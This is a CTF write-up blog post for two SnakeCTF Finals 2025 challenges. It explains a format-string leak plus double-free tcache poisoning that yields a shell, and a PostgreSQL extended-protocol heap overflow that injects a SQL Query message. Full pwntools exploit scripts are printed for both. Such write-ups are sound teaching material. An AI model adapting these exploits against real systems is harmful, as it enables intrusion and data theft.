---
title: "SnakeCTF Finals 2025"
date: 2025-12-08T00:00:00+00:00
# weight: 1
# aliases: ["/first"]
tags: ["finals", "ctf", "pwn", "reverse", "snakectf"]
author: "AlBovo"
# author: ["Me", "You"] # multiple authors
showToc: true
TocOpen: false
draft: false
hidemeta: false
comments: false
description: "The writeups of all the challenges I've solved during the SnakeCTF Finals 2025."
canonicalURL: "https://albovo.github.io/en/ctf/"
disableHLJS: false
disableShare: false
hideSummary: false
searchHidden: true
ShowReadingTime: true
ShowBreadCrumbs: true
ShowPostNavLinks: true
ShowWordCount: true
ShowRssButtonInSectionTermList: true
UseHugoToc: true
cover:
    image: "https://opengraph.githubassets.com/eccdc445364e4f9dcbece7bb7f178f0756be13a48717c78ec94bf78c35861b9a/AlBovo/CTF-Writeups" # image path/url
    alt: "SnakeCTF Finals 2025 🐍" # alt text
    caption: "The writeups of all the challenges I've solved during the SnakeCTF Finals 2025." # display caption under cover
    relative: false # when using page bundles set this to true
    hidden: true # only hide on current single page
editPost:
    URL: "https://github.com/AlBovo/AlBovo.github.io/blob/main/content/en"
    Text: "Suggest Changes" # edit text
    appendFilePath: true # to append file path to Edit link
---
# SnakeCTF Finals 2025 🐍
![snakectf logo](/images/snake.png)

Before diving into the solutions for the two challenges I worked on with `@Gabrain24` and `@Renny`, I want to say how much I enjoyed playing this CTF. It was a lot of fun, and sharing the experience with my teammates and friends from the **pwnthem0le** team made it even better.

## Shellcode Wannabe

**Shellcode Wannabe** was a simple ELF binary for `x86_64` written in `C`, providing the user with four main actions:

* **Create** a shellcode, allocating *0x400* bytes on the heap in a `RW` memory mapping.
* **Delete** a shellcode, freeing the chunk allocated during creation.
* **Edit** a shellcode, overwriting its bytes.
* **Execute** the shellcode, by literally calling it:

  ```asm
  mov     rdx, [rbp+s]
  mov     eax, 0
  call    rdx
  ```

Before the service actually started, the challenge invoked the `initialize_challenge` function, implemented as follows:

```c
__int64 initialize_challenge()
{
  unsigned int v0;
  __int64 result;
  int i;

  setbuf(stdout, 0);
  setbuf(stdin, 0);
  setbuf(stderr, 0);
  v0 = time(0);
  srand(v0);
  menu();
  for ( i = 0; i <= 15; ++i )
    secret[i] = rand() % 26 + 65;
  shellcode = (__int64)mmap(0, 0x400u, 7, 34, -1, 0); // RWX memory
  result = shellcode;
  if ( shellcode == -1 )
  {
    perror("mmap");
    exit(1);
  }
  return result;
}
```

This setup was interesting because, as mentioned earlier, the challenge allowed us to write **only** to a Read-Write memory region, meaning we couldn't directly execute our own injected code.
Therefore, obtaining the flag required first leaking the address of the shellcode and then achieving *some form of arbitrary write* onto that RWX mapping.

This was possible due to multiple vulnerabilities in the challenge, such as:

* **Double free**, the delete command never checked whether a pointer had already been freed.
* **Printf vulnerability**, in each iteration, the challenge printed the disassembled version of the shellcode using *capstone*. During this process, it validated a **16-byte secret** (used as a sanity check on the shellcode memory), and only when the shellcode was exactly **992 bytes** long, it appended an additional **32-byte string** to the disassembly. This string started with the secret and ended with 16 bytes that could easily be overwritten once the secret was known.

```c
char *__fastcall print_assembly(__int64 a1, int a2)
{
  ...
  v3 = a2;
  v14 = __readfsqword(0x28u);
  *(_QWORD *)format = 0;
  v12 = 0;
  memset(s, 0, 0xFFF0u);
  v9 = (char *)malloc(0x10000u);
  if ( a2 > 992 )
    v3 = 992;
  if ( strncmp((const char *)(a1 + 992), secret, 0x10u) )
    return 0;
  if ( (unsigned int)cs_open(3, 8, &v5) )
    return 0;
  v10 = cs_disasm(v5, a1, v3, 4096, 0, &v6);
  if ( v10 )
  {
    v7 = 0;
    for ( i = 0; i < v10; ++i )
    {
      v4 = snprintf(
             &format[v7],
             0x100u,
             "0x%lx:\t%s\t\t%s\n",
             *(_QWORD *)(v6 + 240 * i + 8),
             (const char *)(v6 + 240 * i + 34),
             (const char *)(v6 + 240 * i + 66));
      if ( v4 < 0 )
        return 0;
      if ( (unsigned __int64)(v4 + v7) > 0xFFFF )
        return 0;
      v7 += v4;
    }
    if ( v3 == 992 ) // only when 992 bytes long
      memcpy(&format[v7], (const void *)(a1 + 992), 0x20u); // 32 bytes
    snprintf(v9, 0x10000u, format); // printf vulnerability
    cs_free(v6, v10);
  }
  else
  {
    puts("ERROR: Failed to disassemble given code!");
  }
  cs_close(&v5);
  return v9;
}
```

With this in mind, the first step was to leak the secret.

This turned out to be straightforward: by writing a *992-byte* shellcode composed entirely of `nop` instructions, the challenge would leak the secret as part of the disassembly process. Once leaked, we could overwrite it to overflow into the next 16 bytes, as explained above.

Using this primitive, we were able to leak nearly everything we needed, including:

* The address of `main`.
* A random address from the heap.

From these, we recovered both the PIE base address of the main executable and the base of the heap region.

At this point, the remaining steps were to leak the RWX region address (which was possible thanks to leaking **PIE** and thus the `.bss` address of the shellcode pointer) and then force `malloc` to return that same pointer.

```
.bss:0000000000202050                 public secret
.bss:0000000000202050 ; char secret[]
.bss:0000000000202050 secret          dq ?                    ; DATA XREF: initialize_challenge+96↑o
.bss:0000000000202050                                         ; print_assembly+8F↑o ...
.bss:0000000000202058 qword_202058    dq ?                    ; DATA XREF: main+173↑r
.bss:0000000000202060                 public shellcode
.bss:0000000000202060 shellcode       dq ?                    ; DATA XREF: initialize_challenge+CF↑w
.bss:0000000000202060                                         ; initialize_challenge+D6↑r
.bss:0000000000202060 _bss            ends
```

Leaking the RWX region required using the printf primitive again, but with some care: the address was **aligned to 64 bits**, meaning the presence of a leading null byte caused `printf` to fail.
This subtle issue cost me roughly an hour of debugging during the CTF.

Once all leaks were obtained, the last step was to achieve an arbitrary write into the RWX region. The approach was:

1. **Delete** a shellcode, leaving a freed chunk in the challenge’s memory.
2. **Edit** that same shellcode, overwriting the freed chunk’s `fwd` (tcache due to small size) pointer so it pointed to the RWX region.
3. **Create** two new shellcodes; the second allocation returned a pointer into the RWX region, allowing us to write a classic `bash shellcode`, which we then executed to obtain the remote flag.

If you're interested in the exploit I developed, here it is (~~it's a bit horrible tbh~~):

```python
#!/usr/bin/env python3

from pwn import *

TOKEN = "XXXXXXXXXXXXXXXXXXXXXXXXXXXX"

exe = ELF("./chall_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe
context.terminal = ('tmux', 'splitw', '-h')

def conn():
    if args.GDB:
        return gdb.debug([exe.path], gdbscript="""
            b *print_assembly+656
            b *main+598
            c
        """)
    return remote("shellcode-wannabe.challs.snakectf.org", 1337, ssl=True)

def main():
    r = conn()

    if not args.GDB:
        r.sendlineafter(b": ", TOKEN.encode())
    r.sendlineafter(b": ", b"create")
    r.sendlineafter(b": ", b"create")
    r.sendlineafter(b": ", b"edit")
    r.sendafter(b": ", asm("nop")*992)
    r.sendlineafter(b": ", b"delete")
    for _ in range(992):
        r.recvline()
    secret = r.recvline().strip()
    print(secret)

    r.sendlineafter(b": ", b"create")
    r.sendlineafter(b": ", b"edit")
    r.sendlineafter(b": ", asm("nop")*992 + secret + b"%p%8209$p")
    for _ in range(993):
        r.recvline()
    f = r.recvline()[16:].decode().strip()
    for _ in range(992):
        r.recvline()
    data = r.recvline().decode().strip()
    f = int(data[16:31], 16)
    f1 = int(data[30:], 16) - 0x136c
    exe.address = f1 - exe.sym["main"]
    r.sendlineafter(b": ", b"delete")
    print(f"leak heap: {hex(f)}")
    print(f"leak base addr exe: {hex(exe.address)}")

    r.sendlineafter(b": ", b"create")
    r.sendlineafter(b": ", b"edit")
    r.sendafter(b": ", asm("nop")*992 + secret + b"%1753$sA" + p64(exe.address + 0x202060 + 4861 + 1))

    for _ in range(993 + 994):
        r.recvline()
    data = b'\0' + r.recvline().strip()[16:][:5].ljust(7, b"\x00")

    print(len(data))
    r.sendlineafter(b": ", b"delete")
    
    for _ in range(992):
        r.recvline()
    # inizio double free
    r.sendlineafter(b": ", b"edit")
    r.sendafter(b": ", data)
    for _ in range(992):
        r.recvline()
    log.info("Leak: " + hex(u64(data)))
    log.info("Orig: " + hex(exe.address + 0x202060 + 4861))
    log.info("F: " + hex(f))

    r.sendlineafter(b": ", b"create")
    r.sendlineafter(b": ", b"create")

    r.sendlineafter(b": ", b"edit")
    r.sendlineafter(b": ", asm(shellcraft.sh()))

    r.interactive()


if __name__ == "__main__":
    main()
```

## PG Slop Notes 🔥

This challenge was an absolute banger. `@Renny` and I had so much fun solving it that, after a while, we stopped caring about the scoreboard and just wanted to keep playing with the binary.

The service exposed a “sloppy” interface to a remote PostgreSQL database. The binary itself was just a client: it connected to a remote DB and allowed the user to interact with it through a simple menu:

```c
void __cdecl menu()
{
  puts("1 > New note");
  puts("2 > Search note by ID");
  puts("3 > Search note by owner");
  puts("4 > Edit note");
  puts("5 > Delete note");
  puts("6 > Exit");
}
```

On the remote side, the database schema looked like this:

```sql
create table notes (
    id serial primary key,
    content text not null,
    created_at timestamp default current_timestamp,
    owner varchar(64) not null,
    secret_key varchar(16) not null
);

create table flags (
    flag varchar(128) primary key
);

insert into flags (flag) values ('snakeCTF{placeholder}');
```

The flag was stored in a dedicated `flags` table, and none of the normal functions of the program ever touched it. There was no menu option that referenced `flags`. So the only realistic way to retrieve the flag was to somehow tamper with the SQL being sent, or abuse the PostgreSQL wire protocol itself.

The interesting twist was that the binary did not use the simple `Query` messages over the protocol. Instead, it used the PostgreSQL extended query protocol and constructed messages such as Bind, Describe, Execute, and Sync, then sent them as one combined buffer over the socket.


The function `pg_conn_run_prepared_stmt` was responsible for sending a prepared statement and its parameters. Internally, it created four messages in this order:

* a **Bind** message that took a prepared statement and some parameters and turned them into a portal,
* a **Describe** message to get metadata about the portal or statement,
* an **Execute** message to actually run the portal,
* and a final **Sync** message to flush everything and get the server back to a consistent state.

All four messages were then serialized into one contiguous heap buffer and written to the socket in one `send()` call.

The Bind message is the one that matters most for the exploit, because it is where user-controlled data (the note content, the owner, the secret key) is packed into the protocol.

Its structure, simplified, looks like this. First comes a header with the message type (`'B'`), the overall length, the portal name, and the statement name:

```text
+--------+-----------------------+------------------------------+-------------------------------+
| 1 byte | 4 bytes               | variable                     | variable                      |
| 'B'    | length (Int32)        | portal name (String, C-str)  | statement name (String)       |
+--------+-----------------------+------------------------------+-------------------------------+
                                      ^
                                      length includes everything from here to the end
```

Then come the parameter formats, the parameter values, and the result formats. The key part for us is how parameter values are encoded: for each parameter there is a 4-byte length field followed by that many bytes of data, or `-1` if it is NULL.

The other messages (Describe, Execute, Sync) are comparatively simple:

* Describe contains a type flag (“statement” or “portal”) and a name.
* Execute contains the portal name and a max-row count.
* Sync is basically just a fixed-size “flush everything” message.

The important bit is not their semantics, but the fact that they are all written into a single buffer after the Bind message. That makes the layout look like this in memory:

```text
[ Bind ][ Describe ][ Execute ][ Sync ]
```

If we manage to miscompute the size of the Bind message, we can overflow into the following ones.

The “New note” functionality gave us exactly the primitive we needed. The handler for creating a new note read the note content from stdin using `read()` and then used that as the first parameter for the prepared statement `insert_note`.

The code looked like this:

```c
printf("Content: ");
len = read(0, content_buf, 0x1FFu); // 511 bytes max
if ( len )
{
  content_buf[len] = 0;
  content_buf[strcspn(content_buf, "\n")] = 0;

  printf("Owner: ");
  fgets(owner, 64, stdin);
  owner[strcspn(owner, "\n")] = 0;

  gen_random_secret_key(secret_key, 0x11u);
  secret_key[16] = 0;

  params[0].value = content_buf;
  params[0].length = len;              // uses length as returned by read()
  params[1].value = owner;
  params[1].length = strlen(owner);
  params[2].value = secret_key;
  params[2].length = 16;

  result = pg_conn_run_prepared_stmt(conn, "insert_note", 3u, params);
  if ( result && result->row_count > 0 )
    printf(
      "Note created with ID: %.*s.\nUse secret key %.16s to edit/delete.\n",
      ***result->rows,
      (**result->rows + 4LL),
      secret_key);
  else
    puts("Failed to create note");
  pg_query_result_free(result);
}
else
{
  puts("Invalid content length.");
}
```

The subtlety is in `params[0].length = len;`. That `len` is the return value of `read()`, which counts raw bytes, including any `\0` bytes embedded in the input.

Later, when the Bind message is built, the function `pg_msg_get_size` is used to compute how big the message will be. This size is then used to allocate the heap buffer that will hold the Bind + Describe + Execute + Sync messages. However, `pg_msg_get_size` uses `strlen()` on the parameter values instead of their explicit length fields.

The implementation of `pg_msg_get_size` for Bind looks like this (simplified):

```c
pg_msg_get_size(msg)
{
  param_sizes = 0;
  for ( i = 0; i < *(msg + 12); ++i )
    param_sizes += strlen(*(*(8LL * i + *(msg + 4)) + 8LL)) + 4;

  v1 = strlen(*(msg + 1));    // statement name
  return v1 + strlen(*(msg + 2)) + param_sizes + 13;
}
```

So the Bind message size is computed by summing `strlen(parameter_value) + 4` for each parameter. If our content contains a null byte in the middle, then `strlen()` will stop at that null byte and effectively see a shorter string than what we actually provided.

Consider an input like this:

```text
"AAAA\x00AAAA\n"
```

The `read()` call sees 10 bytes: four `A`s, a `\0`, four more `A`s, and a newline. So `len = 10`. The program then replaces the newline with a null terminator, but the string still contains that first `\0` in the middle. If you call `strlen(content_buf)` on this, you only get 4, because it stops at the first `\0`.

This creates a mismatch:

* The parameter structure for Bind says “length = 10”.
* The Bind size calculation, using `strlen()`, says “this parameter has 4 bytes of data”.

The heap allocation for the combined messages uses `pg_msg_get_size(bind_msg)` with the shorter size, so the allocated buffer is too small for the data that will be copied later.

The final nail in the coffin is the code that actually serializes the Bind parameters into the buffer. It recomputes `vlen` with `strlen()`, but then uses the `.length` field (set from `read()`) as the copy size:

```c
for ( i = 0; i < msg->param_count; ++i )
{
  vlen = strlen(msg->param_values[i]->value); // short length
  *(int32_t *)&buffer[offset] = htonl(vlen);  // this is what is encoded into the message
  offsetb = offset + 4;

  memcpy(&buffer[offsetb],
         msg->param_values[i]->value,
         msg->param_values[i]->length);       // copies full read() length

  offset = vlen + offsetb;                   // advances only by vlen, not by copied bytes
}
```

In other words, the Bind serializer:

* tells PostgreSQL “there are vlen bytes of parameter data,”
* actually writes `length` bytes of user data into the heap buffer, which can be larger than `vlen`,
* and then advances the write offset as if it had only written `vlen` bytes.

Because the heap buffer itself was sized based on `strlen()` as well, the combination of these mistakes leads to a heap buffer overflow: user-controlled data from the Bind parameters overflows past the end of where the Bind message was supposed to stop.

Now we go back to `pg_conn_run_prepared_stmt`. After calculating all sizes, it allocates one big buffer:

```c
bind_msg_size     = pg_msg_get_size(bind_msg);
describe_msg_size = pg_msg_get_size(describe_msg);
execute_msg_size  = pg_msg_get_size(execute_msg);
total = execute_msg_size + describe_msg_size + bind_msg_size + pg_msg_get_size(sync_msg);
buf = malloc(total);
```

Then it serializes each message into the appropriate position:

```c
sync_msg_size      = pg_msg_serialize_to(sync_msg, &buf[execute_msg_size + describe_msg_size + bind_msg_size]);
execute_msg_sizea  = pg_msg_serialize_to(execute_msg, &buf[describe_msg_size + bind_msg_size]);
describe_msg_sizea = pg_msg_serialize_to(describe_msg, &buf[bind_msg_size]);
bind_msg_sizea     = pg_msg_serialize_to(bind_msg, buf);
```

So the intended layout is:

```text
buf:
  [ Bind ][ Describe ][ Execute ][ Sync ]
```

However, the Bind serialization writes more bytes than `bind_msg_size` because of the length mismatch. That means the Bind data overflows into whatever was supposed to be the Describe, Execute, and Sync messages.

From our perspective, this is a powerful primitive: we now control a chunk of memory that will be sent verbatim over the network after a valid Bind. By carefully choosing the contents of the overflow, we can overwrite the following messages with arbitrary protocol bytes.

Even better, by placing the null byte at the very beginning of the note content, we make `strlen(content_buf)` essentially zero while still having up to 510 bytes from `read()`. This maximizes the difference between the “declared” size and the actual data written, and gives us a large area to overwrite.

In the end, instead of the original layout:

```text
+---+---+---+---+
| B | D | E | S |  (intended)
+---+---+---+---+
```

we effectively end up with:

```text
+---+-----------+
| B | Q-crafted |  (what we actually send)
+---+-----------+
```

The Bind remains valid, but the rest of the stream becomes whatever we injected. In particular, we can write a `Query` message (`'Q'`) with arbitrary SQL.

We still need a way to get the result of our malicious query back to us. That is where the printing logic for “New note” comes in.

After `pg_conn_run_prepared_stmt` returns, the function checks the result and, if at least one row was returned, it prints out an ID as a string:

```c
result = pg_conn_run_prepared_stmt(conn, "insert_note", 3u, params);
if ( result && result->row_count > 0 )
  printf(
    "Note created with ID: %.*s.\nUse secret key %.16s to edit/delete.\n",
    ***result->rows,
    (**result->rows + 4LL),
    secret_key);
else
  puts("Failed to create note");
```

The exact indexing into `result->rows` is a bit ugly, but the idea is straightforward: it takes the first column of the first row and prints it as a string. Under normal circumstances, the prepared statement for inserting a note would return the new note’s `id`, and the program would show “Note created with ID: 42” or something similar.

However, because we have overwritten the trailing messages with our own `Query` message, we can instead execute a query like:

```sql
SELECT flag FROM flags;
```

The server will run that query and send back one row containing the flag. The client code, still believing it is receiving the result of `insert_note`, will happily treat the first field of that row as the “note ID” and print it. The string that appears in place of the ID is in fact the flag.

So the full chain is:

* use the input handling bug to create a large mismatch between `read()` and `strlen()`,
* exploit that mismatch to overflow the Bind message into the region that should contain Describe, Execute, and Sync,
* overwrite that region with a valid PostgreSQL Query message that selects the flag,
* and let the normal printing logic display the result of our malicious query as the note ID.

The only tricky part is crafting the protocol bytes correctly so that, after the Bind, the server sees a well-formed `Q` message with the right length and SQL string. Once that is done, the leak is straightforward.


### Exploit

During the CTF we wrote a somewhat messy Python exploit that recreated the Bind message, carefully inserted a `\0` early in the note content, and then used the resulting overflow to overwrite the rest of the send buffer with a hand-crafted `Query` message. The exploit code itself is not particularly beautiful, but it worked reliably enough to dump the flag, so we left it as-is.

Once we understood that the Bind message was undercounted while still copying all the bytes returned by `read()`, everything fell into place: we could smash the following protocol messages and inject our own SQL query. The fact that the client then printed the first column of the first row as a string gave us the perfect exfiltration channel, and the flag came back disguised as a “note ID”.

Overall, it was a very fun challenge, and a great excuse to get our hands dirty with the PostgreSQL extended query protocol.

```python
#!/usr/bin/env python3
from pwn import *

exe = ELF("./chall_patched")

context.binary = exe
context.terminal = ("tmux", "splitw", "-h")

def conn():
    if args.LOCAL:
        r = process([exe.path], env={"PGPASSWORD": "postgres"}, aslr=False)
        gdb.attach(r, gdbscript="" \
        # "b * pg_conn_send if *(unsigned char*)$rsi == 0x42 || *(unsigned char*)$rsi == 0x51\n" \
        "b *pg_bind_msg_serialize_to")
    else:
        r = remote("f4dba05dc6e4eb22899e88cc0e710ea6.pg-slop-notes.challs.snakectf.org", 1337, ssl=True)

    return r


def q(r):
    r.recvuntil(b': ')

def new_note(r, content, owner):
    r.recvlines(6)
    r.recvuntil(b'> ')
    r.sendline(b'1')
    q(r)
    r.sendline(content)
    q(r)
    r.sendline(owner)
    return
    

def query(sql, size=None):
    query_bytes = sql.encode('utf-8') + b'\x00'
    length = 4 + len(query_bytes)
    return b'Q' + struct.pack('!I', size if size else length) + query_bytes

def stat_query(sql, size=None):
    query_bytes = sql.encode('utf-8') + b'\x00'
    length = 4 + len(query_bytes)
    return b'P' + struct.pack('!I', size if size else length) + query_bytes + b'\0'*3


def describe_stmt(name=''):
    n = name.encode('utf-8') + b'\x00'
    return b'D' + struct.pack('!I', 5 + len(n)) + b'S' + n

def execute_all(portal=''):
    p = portal.encode('utf-8') + b'\x00'
    return b'E' + struct.pack('!I', 8 + len(p)) + p + b'\x00\x00\x00\x00'

def sync_msg():
    return b'S\x00\x00\x00\x04'

def main():
    r = conn()
    new_note(r, "ciao", "ciao")
    q = b'MERDA'*10 + b'\0' + b'A'*30 + query("select flag from flags;")
    print(new_note(r, q, b"alice"))
    try:
        r.interactive()
    except KeyboardInterrupt:
        print("lol")

if __name__ == "__main__":
    main()
```

## Conclusions
Even though we arrived 8th overall I plan (or at least wish) to partecipate again next year in this cool CTF (to maybe win 😎).